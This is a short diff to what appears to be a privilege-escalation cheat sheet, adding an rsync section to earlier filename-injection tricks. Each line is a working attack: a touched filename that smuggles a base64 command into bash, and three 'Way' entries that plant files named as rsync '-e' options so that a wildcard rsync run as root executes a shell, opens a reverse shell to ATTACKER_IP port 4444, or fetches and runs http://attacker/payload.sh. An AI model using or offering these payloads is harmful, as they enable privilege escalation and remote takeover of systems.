@@ -29,3 +29,16 @@ chmod +x privesc.sh
 touch ./"file.exe; echo base64_string= | base64 -d | bash"
 
 ```
+
+== rsync ==
+Way 1:
+echo "" > '-e sh shell.txt';
+rsync -a -e 'ssh -p 2222' *.txt root@localhost:/tmp/
+
+Way 2:
+echo "" > '-e bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" shell.txt'
+rsync -a *.txt root@localhost:/tmp/
+
+Way 3:
+echo "" > '-e bash -c "curl -s http://attacker/payload.sh | bash" shell.txt'
+rsync -a *.txt root@localhost:/tmp/
